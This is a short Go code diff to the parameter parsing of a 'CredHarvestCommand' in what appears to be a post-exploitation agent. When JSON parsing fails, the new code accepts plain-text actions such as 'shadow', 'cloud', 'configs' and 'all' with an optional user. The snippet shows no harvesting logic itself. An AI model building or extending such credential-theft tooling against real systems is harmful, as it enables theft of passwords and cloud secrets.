@@ -38,10 +38,11 @@ func (c *CredHarvestCommand) Execute(task structs.Task) structs.CommandResult {
 
 	var args credHarvestArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
+		// Plain text fallback: "shadow", "cloud", "configs", "all", "shadow root"
+		parts := strings.Fields(task.Params)
+		args.Action = parts[0]
+		if len(parts) > 1 {
+			args.User = parts[1]
 		}
 	}
 
